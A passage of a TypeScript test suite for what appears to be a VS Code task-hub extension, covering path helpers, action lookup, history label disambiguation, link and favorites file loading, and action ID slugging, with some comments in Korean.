			assert.strictEqual(result.output, '');
		});

		test('should throw error for non-string input', async () => {
			await assert.rejects(async () => {
				await handleStringManipulation({
					id: 'test',
					function: 'basename',
					input: 123 as any
				});
			}, /requires the 'input' property to be a string/);
		});

		test('should throw error for unsupported function', async () => {
			await assert.rejects(async () => {
				await handleStringManipulation({
					id: 'test',
					function: 'unknownFunction',
					input: 'test'
				});
			}, /Unsupported string manipulation function/);
		});

		test('should handle Windows path', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basename',
				input: 'C:\\path\\to\\file.txt'
			});
			// path.basename handles Windows paths correctly, but preserves backslashes on non-Windows systems
			// So we just check that it returns something reasonable
			assert.ok(result.output.includes('file.txt'));
		});

		test('should handle path with multiple dots', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basenameWithoutExtension',
				input: '/path/to/file.min.js'
			});
			assert.strictEqual(result.output, 'file.min');
		});

		test('should handle root path for dirname', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'dirname',
				input: '/file.txt'
			});
			assert.strictEqual(result.output, '/');
		});

		test('should handle relative path', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basename',
				input: './file.txt'
			});
			assert.strictEqual(result.output, 'file.txt');
		});

		test('should handle path with no extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'extension',
				input: '/path/to/file'
			});
			assert.strictEqual(result.output, '');
		});

		test('should handle file with only extension', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basenameWithoutExtension',
				input: '/path/to/.gitignore'
			});
			assert.strictEqual(result.output, '.gitignore');
		});

		test('should handle empty string input', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basename',
				input: ''
			});
			assert.strictEqual(result.output, '');
		});

		test('should handle string with only whitespace for trim', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'trim',
				input: '   '
			});
			assert.strictEqual(result.output, '');
		});

		test('should handle string with newlines for trim', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'trim',
				input: '\n\thello\n\t'
			});
			assert.strictEqual(result.output, 'hello');
		});

		test('should handle mixed case for toLowerCase', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'toLowerCase',
				input: 'Hello WORLD 123'
			});
			assert.strictEqual(result.output, 'hello world 123');
		});

		test('should handle mixed case for toUpperCase', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'toUpperCase',
				input: 'hello world 123'
			});
			assert.strictEqual(result.output, 'HELLO WORLD 123');
		});

		test('should handle path with trailing slash', async () => {
			const result = await handleStringManipulation({
				id: 'test',
				function: 'basename',
				input: '/path/to/dir/'
			});
			// path.basename handles trailing slashes
			assert.ok(result.output.length > 0);
		});

			test('should handle path with multiple slashes', async () => {
				const result = await handleStringManipulation({
					id: 'test',
					function: 'dirname',
					input: '/path//to///file.txt'
				});
				// path.normalize handles this
				assert.ok(result.output.includes('/'));
			});
		});

	suite('findActionById', () => {
		const sampleActions: ActionItem[] = [
			{
				id: 'root-action',
				title: 'Root Action',
				action: { description: 'Root description', tasks: [] }
			},
			{
				id: 'folder',
				title: 'Folder',
				children: [
					{
						id: 'nested-action',
						title: 'Nested Action',
						action: { description: 'Nested description', tasks: [] }
					}
				]
			}
		];

		test('should return top-level action when id matches', () => {
			const result = findActionById(sampleActions, 'root-action');
			assert.ok(result);
			assert.strictEqual(result?.title, 'Root Action');
		});

		test('should return nested action when id matches child', () => {
			const result = findActionById(sampleActions, 'nested-action');
			assert.ok(result);
			assert.strictEqual(result?.title, 'Nested Action');
		});

		test('should return undefined when id is not found', () => {
			const result = findActionById(sampleActions, 'missing');
			assert.strictEqual(result, undefined);
		});
	});

	suite('findActionPathById', () => {
		// Pins history label disambiguation: HistoryEntry.actionPath is built from
		// this helper at execute-time so HistoryItem labels can swap in the
		// folder breadcrumb when same-title actions collide. Path includes
		// the action's own title at the end.
		const tree: ActionItem[] = [
			{
				id: 'root-build',
				title: 'Build',
				action: { description: '', tasks: [] }
			},
			{
				id: 'fw',
				title: 'Firmware',
				children: [
					{
						id: 'fw-build',
						title: 'Build',
						action: { description: '', tasks: [] }
					},
					{
						id: 'fw-sub',
						title: 'Sub',
						children: [
							{
								id: 'fw-sub-build',
								title: 'Build',
								action: { description: '', tasks: [] }
							}
						]
					}
				]
			}
		];

		test('returns single-element path for root-level action', () => {
			assert.deepStrictEqual(findActionPathById(tree, 'root-build'), ['Build']);
		});

		test('returns folder + title path for nested action', () => {
			assert.deepStrictEqual(findActionPathById(tree, 'fw-build'), ['Firmware', 'Build']);
		});

		test('returns full chain for deeply nested action', () => {
			assert.deepStrictEqual(findActionPathById(tree, 'fw-sub-build'), ['Firmware', 'Sub', 'Build']);
		});

		test('returns undefined for missing id', () => {
			assert.strictEqual(findActionPathById(tree, 'nope'), undefined);
		});

		test('returns folder path when id matches a folder itself', () => {
			assert.deepStrictEqual(findActionPathById(tree, 'fw'), ['Firmware']);
		});
	});

	suite('computeDisambiguatedHistoryLabels', () => {
		// Pins history label disambiguation: label swap only fires when two
		// distinct actionIds share the same actionTitle. Same actionId
		// repeated (re-runs) is NOT a collision — that's the common case
		// and must stay terse.
		function entry(partial: Partial<HistoryEntry> & Pick<HistoryEntry, 'actionId' | 'actionTitle'>): HistoryEntry {
			return {
				timestamp: 0,
				status: 'success',
				...partial
			};
		}

		test('no collision → all labels undefined (HistoryItem falls back to title)', () => {
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'a', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'b', actionTitle: 'Flash', actionPath: ['Firmware', 'Flash'] })
			]);
			assert.deepStrictEqual(labels, [undefined, undefined]);
		});

		test('repeated runs of same action do not count as collision', () => {
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'a', actionTitle: 'Build', actionPath: ['Firmware', 'Build'], timestamp: 3 }),
				entry({ actionId: 'a', actionTitle: 'Build', actionPath: ['Firmware', 'Build'], timestamp: 2 }),
				entry({ actionId: 'a', actionTitle: 'Build', actionPath: ['Firmware', 'Build'], timestamp: 1 })
			]);
			assert.deepStrictEqual(labels, [undefined, undefined, undefined]);
		});

		test('collision → both colliding entries get full breadcrumb', () => {
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'bl', actionTitle: 'Build', actionPath: ['Bootloader', 'Build'] })
			]);
			assert.deepStrictEqual(labels, ['Firmware > Build', 'Bootloader > Build']);
		});

		test('collision affects only entries that share the title', () => {
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'bl', actionTitle: 'Build', actionPath: ['Bootloader', 'Build'] }),
				entry({ actionId: 'flash', actionTitle: 'Flash', actionPath: ['Firmware', 'Flash'] })
			]);
			assert.deepStrictEqual(labels, ['Firmware > Build', 'Bootloader > Build', undefined]);
		});

		test('legacy entry (no actionPath) on collision falls back to `Title (actionId)`', () => {
			// Without recorded path data the breadcrumb can't help, but the
			// distinct-id invariant still holds: append actionId so the
			// legacy row is visually distinct from the colliding one.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw', actionTitle: 'Build' }),
				entry({ actionId: 'bl', actionTitle: 'Build', actionPath: ['Bootloader', 'Build'] })
			]);
			assert.deepStrictEqual(labels, ['Build (fw)', 'Bootloader > Build']);
		});

		test('root-level action (actionPath of length 1) on collision falls back to `Title (actionId)`', () => {
			// A root action's path is just [title] — joining yields the
			// title back, providing zero disambiguation. Use the id suffix
			// instead so the row is distinct from the nested colliding entry.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'root', actionTitle: 'Build', actionPath: ['Build'] }),
				entry({ actionId: 'fw', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] })
			]);
			assert.deepStrictEqual(labels, ['Build (root)', 'Firmware > Build']);
		});

		test('empty input → empty output', () => {
			assert.deepStrictEqual(computeDisambiguatedHistoryLabels([]), []);
		});

		test('two distinct actionIds with the same actionPath → both get (id) suffix', () => {
			// Possible when the action tree contains a duplicated folder
			// structure (two `Firmware` folders both holding `Build`), or
			// when a legacy entry's stored path matches a renamed action's
			// current path. Step 1 alone would leave both rows as
			// "Firmware > Build" with no way to tell them apart — step 2
			// must append the actionId to both.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw1.build', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'fw2.build', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] })
			]);
			assert.deepStrictEqual(labels, [
				'Firmware > Build (fw1.build)',
				'Firmware > Build (fw2.build)'
			]);
		});

		test('same actionId repeated with same path is NOT a path collision', () => {
			// Even though two entries share the same path, they share the
			// same actionId — that's just re-runs of one action. Step 2
			// requires distinct actionIds, so no suffix is added.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw.build', actionTitle: 'Build', actionPath: ['Firmware', 'Build'], timestamp: 2 }),
				entry({ actionId: 'fw.build', actionTitle: 'Build', actionPath: ['Firmware', 'Build'], timestamp: 1 }),
				entry({ actionId: 'bl.build', actionTitle: 'Build', actionPath: ['Bootloader', 'Build'] })
			]);
			assert.deepStrictEqual(labels, [
				'Firmware > Build',
				'Firmware > Build',
				'Bootloader > Build'
			]);
		});

		test('mixed: two share path, one has unique path → only the shared pair gets suffix', () => {
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'fw1', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'fw2', actionTitle: 'Build', actionPath: ['Firmware', 'Build'] }),
				entry({ actionId: 'bl', actionTitle: 'Build', actionPath: ['Bootloader', 'Build'] })
			]);
			assert.deepStrictEqual(labels, [
				'Firmware > Build (fw1)',
				'Firmware > Build (fw2)',
				'Bootloader > Build'
			]);
		});

		test('two root-level actions with same title → both get `Title (actionId)`', () => {
			// Pure root-level collision — neither has a usable breadcrumb,
			// so the id suffix is the only disambiguation available. The
			// distinct-id invariant must still hold.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'root.build.a', actionTitle: 'Build', actionPath: ['Build'] }),
				entry({ actionId: 'root.build.b', actionTitle: 'Build', actionPath: ['Build'] })
			]);
			assert.deepStrictEqual(labels, ['Build (root.build.a)', 'Build (root.build.b)']);
		});

		test('root-level repeated runs of same actionId stay bare even when title appears elsewhere', () => {
			// titleToActionIds size for 'Build' = 1 only because root.a
			// appears twice (same id). No collision detected → label
			// undefined → bare title. The unique 'Flash' row is unaffected.
			const labels = computeDisambiguatedHistoryLabels([
				entry({ actionId: 'root.a', actionTitle: 'Build', actionPath: ['Build'], timestamp: 2 }),
				entry({ actionId: 'root.a', actionTitle: 'Build', actionPath: ['Build'], timestamp: 1 }),
				entry({ actionId: 'flash', actionTitle: 'Flash', actionPath: ['Flash'] })
			]);
			assert.deepStrictEqual(labels, [undefined, undefined, undefined]);
		});
	});

	suite('insertActionIntoDestination', () => {
		test('should push new action to root when destination has no folderRef', () => {
			const workspaceActions: ActionItem[] = [];
			const destination = {
				label: 'Root',
				description: 'Add at root'
			} as any;
			const newAction: ActionItem = {
				id: 'new',
				title: 'New Action',
				action: { description: 'desc', tasks: [] }
			};

			insertActionIntoDestination(workspaceActions, destination, newAction);
			assert.strictEqual(workspaceActions.length, 1);
			assert.strictEqual(workspaceActions[0], newAction);
		});

		test('should create children array when inserting into folder', () => {
			const folder: ActionItem = {
				id: 'folder',
				title: 'Folder'
			};
			const workspaceActions: ActionItem[] = [folder];
			const destination = {
				label: 'Folder',
				description: 'Insert into folder',
				folderRef: folder
			} as any;
			const newAction: ActionItem = {
				id: 'nested',
				title: 'Nested',
				action: { description: 'nested desc', tasks: [] }
			};

			insertActionIntoDestination(workspaceActions, destination, newAction);
			assert.ok(folder.children);
			assert.strictEqual(folder.children?.length, 1);
			assert.strictEqual(folder.children?.[0], newAction);
		});
	});

	suite('buildDestinationPickItems (Create Action wizard)', () => {
		test('returns Root only when actions.json has no folders so the wizard can skip the prompt', () => {
			const items = buildDestinationPickItems([]);
			assert.strictEqual(items.length, 1, 'flat actions.json should yield a single Root item');
			assert.strictEqual(items[0].folderRef, undefined);
		});

		test('Root description matches the actual append-to-end behavior, not "top of file"', () => {
			// Regression guard for the v0.4.31 fix: previously the description
			// claimed "top of actions.json" but `insertActionIntoDestination`
			// pushes to the end. Description now describes the *level*.
			const items = buildDestinationPickItems([]);
			const root = items[0];
			assert.ok(root.description, 'Root item must have a description');
			assert.ok(
				!/최상단|top of/i.test(root.description!),
				`Root description should not claim "top of file" position; got: ${root.description}`
			);
		});

		test('lists each folder under Root with its full path label', () => {
			const folder: ActionItem = {
				id: 'tools',
				title: 'Tools',
				type: 'folder',
				children: [
					{ id: 'tools.nested', title: 'Nested', type: 'folder', children: [] }
				]
			};
			const items = buildDestinationPickItems([folder]);
			assert.strictEqual(items.length, 3, 'Root + Tools + Tools/Nested');
			assert.strictEqual(items[1].folderRef?.id, 'tools');
			assert.strictEqual(items[2].folderRef?.id, 'tools.nested');
			assert.ok(items[2].label.includes('Tools'), 'nested folder label should carry the parent path');
		});
	});

	suite('deriveLinkTitleFromUrl', () => {
		test('returns the host without leading "www."', () => {
			assert.strictEqual(deriveLinkTitleFromUrl('https://www.github.com/user/repo'), 'github.com');
			assert.strictEqual(deriveLinkTitleFromUrl('https://example.org/path?q=1'), 'example.org');
		});

		test('keeps non-www subdomains intact', () => {
			assert.strictEqual(deriveLinkTitleFromUrl('https://api.example.com/v1'), 'api.example.com');
		});

		test('falls back to the trimmed input when URL parsing fails', () => {
			// The save-time validateLinkUrlForSave (scheme allowlist +
			// WHATWG `new URL()` parse) blocks unparseable URLs from
			// being persisted — `validateLinkScheme` alone would let bare
			// `https://` through, which is exactly the v0.4.32 fix. The
			// title prompt still needs *some* non-empty default while the
			// user is mid-typing, so this fallback exists.
			assert.strictEqual(deriveLinkTitleFromUrl('not a url'), 'not a url');
			assert.strictEqual(deriveLinkTitleFromUrl('  https://valid.com  '), 'valid.com');
		});

		test('returns empty string for empty input so the prompt stays empty', () => {
			assert.strictEqual(deriveLinkTitleFromUrl(''), '');
			assert.strictEqual(deriveLinkTitleFromUrl('   '), '');
		});

		test('handles mailto and other allowed schemes', () => {
			// `new URL('mailto:foo@bar')` has empty host; we fall back to the
			// raw string so the user sees something meaningful.
			assert.strictEqual(deriveLinkTitleFromUrl('mailto:foo@bar.com'), 'mailto:foo@bar.com');
		});
	});

	suite('readLinksFromDisk / readFavoritesFromDisk (P1 data-loss guard)', () => {
		// These loaders distinguish "file missing or empty" from "parse
		// failure" so the add/delete/edit commands can refuse to overwrite
		// a corrupt JSON file with a synthetic 1-entry array. Without this
		// guard, the v0.4.31 actions.json fix would not extend to the
		// links/favorites side.
		let tempDir: string;

		setup(() => {
			tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'taskhub-loader-'));
		});

		teardown(() => {
			try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch { /* best-effort */ }
		});

		test('readLinksFromDisk returns ok with empty entries when the file does not exist', () => {
			const result = readLinksFromDisk(path.join(tempDir, 'never-created.json'));
			assert.strictEqual(result.ok, true);
			if (result.ok) { assert.deepStrictEqual(result.entries, []); }
		});

		test('readLinksFromDisk returns ok:false on JSON syntax error so write commands can refuse to save', () => {
			const filePath = path.join(tempDir, 'broken.json');
			fs.writeFileSync(filePath, '{ not really json');
			const result = readLinksFromDisk(filePath);
			assert.strictEqual(result.ok, false);
			if (!result.ok) { assert.ok(result.error.length > 0, 'error message should not be empty'); }
		});

		test('readLinksFromDisk returns ok:false when the top-level value is not an array', () => {
			const filePath = path.join(tempDir, 'not-array.json');
			fs.writeFileSync(filePath, '{"title": "x", "link": "https://x"}');
			const result = readLinksFromDisk(filePath);
			assert.strictEqual(result.ok, false);
			if (!result.ok) { assert.match(result.error, /array/i); }
		});

		test('readLinksFromDisk returns parsed entries when the file is valid', () => {
			const filePath = path.join(tempDir, 'valid.json');
			fs.writeFileSync(filePath, JSON.stringify([
				{ title: 'GitHub', link: 'https://github.com', group: 'Dev', tags: ['vcs'] },
				{ title: 'Bad', link: 42 }
			]));
			const result = readLinksFromDisk(filePath);
			assert.strictEqual(result.ok, true);
			if (result.ok) {
				assert.strictEqual(result.entries.length, 1);
				assert.strictEqual(result.entries[0].title, 'GitHub');
				assert.strictEqual(result.entries[0].group, 'Dev');
				// **버리지 않고 들고 온다.** 예전 주석은 "schema-mismatch entries are
				// silently skipped" 로 이 조용한 삭제를 정상 계약으로 고정하고
				// 있었다 — 그 상태에서는 다음 Add/Edit/Delete 가 걸러진 배열을
				// 되써서 이 항목이 영구히 사라졌다.
				assert.deepStrictEqual(result.invalid, [{ index: 1, raw: { title: 'Bad', link: 42 } }]);
			}
		});

		/**
		 * 무효 항목이 **쓰기를 왕복해 살아남는지**가 진짜 판정이다. 로더가
		 * 들고만 오고 쓰기 경로가 쓰지 않으면 데이터는 그대로 사라진다.
		 */
		test('mergeInvalidJsonEntries 가 무효 항목을 원래 자리로 되돌린다', () => {
			const invalid = [{ index: 1, raw: { title: 'Bad', link: 42 } }];
			assert.deepStrictEqual(
				mergeInvalidJsonEntries([{ title: 'A' }, { title: 'C' }], invalid),
				[{ title: 'A' }, { title: 'Bad', link: 42 }, { title: 'C' }]
			);
			// 항목이 줄어 인덱스가 배열을 넘으면 끝에 붙인다 — 위치보다
			// 잃지 않는 것이 우선이다.
			assert.deepStrictEqual(
				mergeInvalidJsonEntries([], [{ index: 5, raw: 'orphan' }]),
				['orphan']
			);
			// 여러 개는 원래 순서대로 들어간다.
			assert.deepStrictEqual(
				mergeInvalidJsonEntries(['a'], [{ index: 2, raw: 'y' }, { index: 0, raw: 'x' }]),
				['x', 'a', 'y']
			);
			// 무효 항목이 없으면 손대지 않는다.
			const untouched = [{ title: 'A' }];
			assert.strictEqual(mergeInvalidJsonEntries(untouched, []), untouched);
		});

		/**
		 * 쓰기 경로 전체를 흉내 낸다: 읽기 → 항목 추가 → 직렬화 → 되쓰기.
		 * 실전에서 데이터가 사라진 형태가 정확히 이것이다.
		 */
		test('무효 항목이 있는 파일에 링크를 추가해도 그 항목이 살아남는다', () => {
			const filePath = path.join(tempDir, 'roundtrip.json');
			const original = [
				{ title: 'GitHub', link: 'https://github.com' },
				{ title: 'Bad', link: 42 },
				{ title: 'Docs', link: 'https://docs.example.com' }
			];
			fs.writeFileSync(filePath, JSON.stringify(original, null, 2));

			const loaded = readLinksFromDisk(filePath);
			assert.strictEqual(loaded.ok, true);
			if (!loaded.ok) { return; }
			const { entries: withNew } = addLinkEntry(loaded.entries, {
				title: 'New', link: 'https://new.example.com', sourceFile: filePath
			});
			const serialized = mergeInvalidJsonEntries(serializeLinks(withNew), loaded.invalid);
			fs.writeFileSync(filePath, JSON.stringify(serialized, null, 2) + '\n');

			const roundTripped = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
			assert.ok(
				roundTripped.some((e: any) => e.title === 'Bad' && e.link === 42),
				`무효 항목이 쓰기에서 사라졌다: ${JSON.stringify(roundTripped)}`
			);
			assert.ok(roundTripped.some((e: any) => e.title === 'New'), '새 항목이 저장되지 않았다');
			assert.strictEqual(roundTripped.length, 4, '항목 수가 맞지 않는다');
		});

		/**
		 * 필수 필드가 있는 **유효한** 항목도 확장 속성과 정규화에서 걸러진 값을
		 * 잃고 있었다. 무효 항목만 보존한 앞선 수정은 절반이었다.
		 */
		test('건드리지 않은 항목의 확장 속성과 비정규 값이 살아남는다', () => {
			const filePath = path.join(tempDir, 'extra-fields.json');
			const original = [
				{
					title: 'GitHub',
					link: 'https://github.com',
					group: 42,                    // 정규화에서 걸러지던 값
					tags: ['keep', 42],           // 42 가 걸러지던 값
					custom: { note: 'mine' }      // 알려지지 않은 확장 속성
				}
			];
			fs.writeFileSync(filePath, JSON.stringify(original, null, 2));

			const loaded = readLinksFromDisk(filePath);
			assert.strictEqual(loaded.ok, true);
			if (!loaded.ok) { return; }
			const { entries: withNew } = addLinkEntry(loaded.entries, {
				title: 'New', link: 'https://new.example.com', sourceFile: filePath
			});
			const serialized = mergeInvalidJsonEntries(serializeLinks(withNew), loaded.invalid);

			assert.deepStrictEqual(
				serialized[0], original[0],
				'손대지 않은 항목이 재직렬화되며 값을 잃었다'
			);
			assert.deepStrictEqual(serialized[1], { title: 'New', link: 'https://new.example.com' });
		});

		/**
		 * 반대 방향. 원본 보존이 **편집을 덮어써서는 안 된다**.
		 *
		 * 처음 이 테스트는 `raw` 가 **없는** 객체를 직접 만들어 통과했는데,
		 * 실제 편집 경로는 기존 항목을 spread 하므로 `raw` 가 함께 복사된다 —
		 * 즉 **실제 경로를 우회한 자기확인 테스트**였고, 그 사이 편집이 조용히
		 * 버려지는 회귀가 그대로 남아 있었다. 이제 실제 경로와 같은 모양
		 * (spread + `edited`) 으로 검증한다.
		 */
		test('편집한 항목은 새 값으로 저장되고 확장 속성은 남는다', () => {
			const filePath = path.join(tempDir, 'edited.json');
			fs.writeFileSync(filePath, JSON.stringify([
				{ title: 'Old', link: 'https://old.example.com', group: 'G', custom: { note: 'mine' } }
			], null, 2));

			const loaded = readLinksFromDisk(filePath);
			assert.strictEqual(loaded.ok, true);
			if (!loaded.ok) { return; }
			const links = [...loaded.entries];
			// **실제 편집 경로와 같은 형태** — 기존 항목을 spread 한다.
			links[0] = {
				...links[0],
				title: 'Renamed',
				link: 'https://new.example.com',
				group: undefined,
				tags: undefined,
				edited: true,
			};
			const serialized = serializeLinks(links) as any[];

			assert.strictEqual(serialized[0].title, 'Renamed', '편집한 제목이 저장되지 않았다');
			assert.strictEqual(serialized[0].link, 'https://new.example.com', '편집한 URL 이 저장되지 않았다');
			assert.strictEqual(serialized[0].group, undefined, '편집으로 비운 그룹이 남았다');
			assert.deepStrictEqual(
				serialized[0].custom, { note: 'mine' },
				'편집하면서 확장 속성이 사라졌다'
			);
		});

		test('편집 표시가 없으면 원본 그대로 (손대지 않은 항목)', () => {
			const filePath = path.join(tempDir, 'untouched.json');
			const original = [{ title: 'A', link: 'https://a.example.com', group: 42 }];
			fs.writeFileSync(filePath, JSON.stringify(original, null, 2));
			const loaded = readLinksFromDisk(filePath);
			assert.strictEqual(loaded.ok, true);
			if (!loaded.ok) { return; }
			assert.deepStrictEqual(serializeLinks(loaded.entries)[0], original[0]);
		});

		test('favorites 도 확장 속성을 보존한다', () => {
			const filePath = path.join(tempDir, 'fav-extra.json');
			const original = [
				{ title: 'README', path: 'README.md', line: '7', owner: 'me' }
			];
			fs.writeFileSync(filePath, JSON.stringify(original, null, 2));

			const loaded = readFavoritesFromDisk(filePath);
			assert.strictEqual(loaded.ok, true);
			if (!loaded.ok) { return; }
			const serialized = serializeFavorites(loaded.entries);

			// `line: '7'` 은 정규화에서 숫자가 아니라 버려지던 값이고
			// `owner` 는 알려지지 않은 속성이다.
			assert.deepStrictEqual(serialized[0], original[0]);
		});

		test('favorites 로더도 같은 계약을 지킨다', () => {
			const filePath = path.join(tempDir, 'partially-invalid-favs.json');
			fs.writeFileSync(filePath, JSON.stringify([
				{ title: 'README', path: 'README.md' },
				{ title: 'NoPath' },
				{ title: 'Docs', path: 'docs/' }
			]));
			const result = readFavoritesFromDisk(filePath);
			assert.strictEqual(result.ok, true);
			if (result.ok) {
				assert.strictEqual(result.entries.length, 2);
				assert.deepStrictEqual(result.invalid, [{ index: 1, raw: { title: 'NoPath' } }]);
			}
		});

		test('readFavoritesFromDisk returns ok:false on parse failure (mirrors links loader contract)', () => {
			const filePath = path.join(tempDir, 'broken-favs.json');
			fs.writeFileSync(filePath, '[ { "title": "ok", ');   // truncated
			const result = readFavoritesFromDisk(filePath);
			assert.strictEqual(result.ok, false);
		});

		test('readFavoritesFromDisk parses valid entries and applies workspaceFolder when supplied', () => {
			const filePath = path.join(tempDir, 'valid-favs.json');
			fs.writeFileSync(filePath, JSON.stringify([
				{ title: 'README', path: 'README.md', line: 5 }
			]));
			const result = readFavoritesFromDisk(filePath, '/some/workspace');
			assert.strictEqual(result.ok, true);
			if (result.ok) {
				assert.strictEqual(result.entries.length, 1);
				assert.strictEqual(result.entries[0].path, 'README.md');
				assert.strictEqual(result.entries[0].line, 5);
				assert.strictEqual(result.entries[0].workspaceFolder, '/some/workspace');
				assert.strictEqual(result.entries[0].sourceFile, filePath);
			}
		});
	});

	suite('deriveActionIdFromTitle', () => {
		test('produces a kebab slug that matches the actions.json id pattern', () => {
			const idPattern = /^[A-Za-z0-9._-]+$/;
			const id = deriveActionIdFromTitle('Build Project', new Set());
			assert.strictEqual(id, 'build-project');
			assert.ok(idPattern.test(id));
		});

		test('falls back to "action" when the title has no alphanumerics', () => {
			assert.strictEqual(deriveActionIdFromTitle('   ', new Set()), 'action');
			assert.strictEqual(deriveActionIdFromTitle('!!!', new Set()), 'action');
		});

		test('appends -2, -3, ... when the slug already exists', () => {
			const existing = new Set(['build-project']);
			assert.strictEqual(deriveActionIdFromTitle('Build Project', existing), 'build-project-2');

			existing.add('build-project-2');
			assert.strictEqual(deriveActionIdFromTitle('Build Project', existing), 'build-project-3');
		});

		test('strips leading/trailing punctuation and collapses runs', () => {
			assert.strictEqual(deriveActionIdFromTitle('  -- Hello, World!! --  ', new Set()), 'hello-world');
		});

		test('0.6.25: 유니코드 문자를 보존한다', () => {
			// 이전에는 [^a-z0-9]로 잘라내 한글 제목이 전부 'action', 'action-2'가
			// 됐다. actions.json / Doctor 메시지 / dependsOn 어디서도 어떤
			// 액션인지 알 수 없는 id다.
			assert.strictEqual(deriveActionIdFromTitle('한글 빌드', new Set()), '한글-빌드');
			assert.strictEqual(deriveActionIdFromTitle('Café ☕', new Set()), 'café');
			assert.strictEqual(deriveActionIdFromTitle('펌웨어 v2 빌드', new Set()), '펌웨어-v2-빌드');
		});

		test('0.6.25: 유니코드 id도 유효한 커맨드 id로 인코딩된다', () => {
			// 스키마는 id에 패턴 제약이 없고 런타임 검증은 중복만 본다. 유일한
			// 하위 제약은 keybindings.json에 들어가는 커맨드 id인데,
			// buildActionCommandId가 non-ASCII 바이트를 percent-encoding 한다.
			const id = deriveActionIdFromTitle('한글 빌드', new Set());
			const commandId = buildActionCommandId(id);
			assert.ok(/^taskhub\.runAction\.[A-Za-z0-9._%-]+$/.test(commandId), commandId);
			assert.notStrictEqual(commandId, buildActionCommandId(deriveActionIdFromTitle('다른 빌드', new Set())),
				'서로 다른 id는 서로 다른 커맨드 id로 매핑돼야 한다');
		});

		test('문자·숫자가 전혀 없는 제목은 여전히 기본값으로 폴백한다', () => {
			assert.strictEqual(deriveActionIdFromTitle('!!!', new Set()), 'action');
			assert.strictEqual(deriveActionIdFromTitle('☕☕', new Set()), 'action');
		});
	});

	suite('validateActionIdInput (저장 전 확인의 ID 편집)', () => {
		test('빈 값과 공백만 있는 값은 거부한다', () => {
			assert.ok(validateActionIdInput('', new Set()));
			assert.ok(validateActionIdInput('   ', new Set()));
		});

		test('공백이 포함된 id는 거부한다', () => {
			// dependsOn 목록이나 로그 한 줄에 들어갔을 때 읽을 수 없다.
			assert.ok(validateActionIdInput('fw build', new Set()));
		});

		test('이미 쓰이는 id는 거부한다', () => {
			const message = validateActionIdInput('fw.build', new Set(['fw.build']));
			assert.ok(message && message.includes('fw.build'), message);
		});

		test('유니코드 id는 허용한다 (스키마에 패턴 제약이 없다)', () => {
			assert.strictEqual(validateActionIdInput('펌웨어-빌드', new Set()), undefined);
			assert.strictEqual(validateActionIdInput('fw.build-2', new Set(['fw.build'])), undefined);
		});

		test('앞뒤 공백은 잘라낸 뒤 판정한다', () => {
			assert.ok(validateActionIdInput('  fw.build  ', new Set(['fw.build'])), '트림 후 중복이면 거부');
			assert.strictEqual(validateActionIdInput('  fw.new  ', new Set(['fw.build'])), undefined);
		});
	});

	suite('createGroupedTaskPresentationOptions', () => {
		test('should default to reveal always and assign group', () => {
			const options = createGroupedTaskPresentationOptions('action-1');
			assert.strictEqual(options.group, 'action-1');
			assert.strictEqual(options.reveal, vscode.TaskRevealKind.Always);
			assert.strictEqual(options.panel, vscode.TaskPanelKind.Shared);
			assert.strictEqual(options.showReuseMessage, true);
		});

		test('should map silent reveal option', () => {
			const options = createGroupedTaskPresentationOptions('action-1', 'silent');
			assert.strictEqual(options.reveal, vscode.TaskRevealKind.Silent);
		});

		test('keeps action-wide group when isParallel is false (backward compat)', () => {
			const options = createGroupedTaskPresentationOptions(
				'action-1',
				'always',
				{ taskId: 'build', isParallel: false }
			);
			assert.strictEqual(options.group, 'action-1');
		});

		test('keeps action-wide group when taskId is missing even if isParallel', () => {
			const options = createGroupedTaskPresentationOptions(
				'action-1',
				'always',
				{ isParallel: true }
			);
			assert.strictEqual(options.group, 'action-1');
		});

		test('splits group to actionId:taskId when isParallel and taskId are both present', () => {
			const options = createGroupedTaskPresentationOptions(
				'action-1',
				'always',
				{ taskId: 'buildA', isParallel: true }
			);
			assert.strictEqual(options.group, 'action-1:buildA');
		});
	});

	suite('serializeFavorites - edge cases', () => {
		test('should handle entry with empty title', () => {
			const entries = [
				{ title: '', path: '/path/to/file' }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: '', path: '/path/to/file' }
			]);
		});

		test('should handle entry with empty path', () => {
			const entries = [
				{ title: 'File', path: '' }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File', path: '' }
			]);
		});

		test('should handle entry with empty group', () => {
			const entries = [
				{ title: 'File', path: '/path', group: '' }
			];
			const result = serializeFavorites(entries);
			// Empty group should not be included
			assert.deepStrictEqual(result, [
